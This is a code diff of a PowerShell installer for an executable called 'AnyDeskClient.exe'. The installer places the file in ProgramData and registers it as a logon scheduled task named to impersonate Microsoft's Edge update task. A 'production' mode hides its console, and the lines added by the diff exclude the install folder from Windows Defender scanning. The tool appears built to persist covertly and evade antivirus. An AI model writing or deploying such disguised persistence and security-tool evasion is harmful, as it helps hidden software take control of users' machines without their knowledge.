@@ -16,6 +16,12 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit 1
 }
 
+# Configuration variables
+$ExeName = "AnyDeskClient.exe"
+$ProcessName = "AnyDeskClient"
+$InstallDir = "$env:ProgramData\AnyDeskClient"
+$TaskName = "MicrosoftEdgeUpdateTaskMachineCore"
+
 Write-Host ""
 Write-Host "========================================"
 Write-Host "  Task Host Service - Install"
@@ -23,8 +29,9 @@ Write-Host "========================================"
 Write-Host ""
 
 # Check if executable exists
-if (-not (Test-Path "dist\AnyDeskClient.exe")) {
-    Write-Host "ERROR: AnyDeskClient.exe not found in dist\ directory."
+$distExePath = "dist\$ExeName"
+if (-not (Test-Path $distExePath)) {
+    Write-Host "ERROR: $ExeName not found in dist\ directory."
     Write-Host "Please run build.ps1 first to create the executable."
     Write-Host ""
     Read-Host "Press Enter to exit"
@@ -32,30 +39,38 @@ if (-not (Test-Path "dist\AnyDeskClient.exe")) {
 }
 
 # Define installation paths
-$InstallDir = "$env:LOCALAPPDATA\Temp"
-$ExePath = "$InstallDir\AnyDeskClient.exe"
-$TaskName = "MicrosoftEdgeUpdateTaskMachineCore"
+$ExePath = "$InstallDir\$ExeName"
 
-Write-Host "[1/4] Creating installation directory"
+Write-Host "[1/6] Creating installation directory"
 if (-not (Test-Path $InstallDir)) {
     New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 }
 Write-Host "  - Directory: $InstallDir"
 Write-Host ""
 
-Write-Host "[2/4] Copying executable"
-Copy-Item "dist\AnyDeskClient.exe" $ExePath -Force
+Write-Host "[2/6] Creating data directory"
+$DataDir = Join-Path $InstallDir "data"
+if (-not (Test-Path $DataDir)) {
+    New-Item -ItemType Directory -Path $DataDir -Force | Out-Null
+    Write-Host "  - Data directory: $DataDir"
+} else {
+    Write-Host "  - Data directory already exists"
+}
+Write-Host ""
+
+Write-Host "[3/6] Copying executable"
+Copy-Item $distExePath $ExePath -Force
 if (-not (Test-Path $ExePath)) {
     Write-Host "ERROR: Failed to copy executable."
     Read-Host "Press Enter to exit"
     exit 1
 }
-Write-Host "  - Copied: AnyDeskClient.exe"
+Write-Host "  - Copied: $ExeName"
 Write-Host ""
 
 # Handle .dev_mode marker
 if ($Dev) {
-    Write-Host "[3/4] Copying .dev_mode marker (DEV MODE)"
+    Write-Host "[4/6] Copying .dev_mode marker (DEV MODE)"
     
     # Check if .dev_mode exists in dist folder (from build)
     if (Test-Path "dist\.dev_mode") {
@@ -70,7 +85,7 @@ if ($Dev) {
     Write-Host "  - Console window will be VISIBLE"
     Write-Host ""
 } else {
-    Write-Host "[3/4] Removing .dev_mode marker (PRODUCTION MODE)"
+    Write-Host "[4/6] Removing .dev_mode marker (PRODUCTION MODE)"
     
     # Delete marker from install dir if it exists
     if (Test-Path "$InstallDir\.dev_mode") {
@@ -88,7 +103,7 @@ if ($Dev) {
     Write-Host ""
 }
 
-Write-Host "[4/4] Creating Task Scheduler service"
+Write-Host "[5/6] Creating Task Scheduler service"
 
 # Delete existing task if it exists
 $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
@@ -116,7 +131,7 @@ Write-Host "  - Trigger: At user logon"
 Write-Host "  - User: $env:USERNAME"
 Write-Host ""
 
-Write-Host "[5/5] Starting service"
+Write-Host "Starting service"
 Start-ScheduledTask -TaskName $TaskName
 Start-Sleep -Seconds 2
 
@@ -126,6 +141,43 @@ if ($task.State -eq "Running") {
 } else {
     Write-Host "  - Warning: Service scheduled but not running yet"
     Write-Host "  - Service will start on next system boot"
+}
+Write-Host ""
+
+Write-Host "[6/6] Configuring Windows Defender exclusion"
+try {
+    # Check if Defender module is available
+    $defenderModule = Get-Module -ListAvailable -Name Defender
+    if ($defenderModule -or (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
+        # Check if exclusion already exists
+        try {
+            $existingExclusions = Get-MpPreference -ErrorAction Stop | Select-Object -ExpandProperty ExclusionPath
+            if ($existingExclusions -notcontains $InstallDir) {
+                Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
+                Write-Host "  - Added folder exclusion: $InstallDir"
+            } else {
+                Write-Host "  - Folder exclusion already exists: $InstallDir"
+            }
+        } catch {
+            Write-Host "  - ERROR: Failed to check/add exclusion" -ForegroundColor Red
+            Write-Host "  - Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
+            Write-Host "  - Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
+            if ($_.Exception.InnerException) {
+                Write-Host "  - Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Yellow
+            }
+            throw  # Re-throw to be caught by outer catch
+        }
+    } else {
+        Write-Host "  - Windows Defender module not available (skipping exclusion)"
+    }
+} catch {
+    Write-Host "  - ERROR: Failed to configure Defender exclusion" -ForegroundColor Red
+    Write-Host "  - Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
+    Write-Host "  - Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
+    if ($_.Exception.InnerException) {
+        Write-Host "  - Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Yellow
+    }
+    Write-Host "  - You may need to add the exclusion manually in Windows Security settings" -ForegroundColor Yellow
 }
 Write-Host ""
 
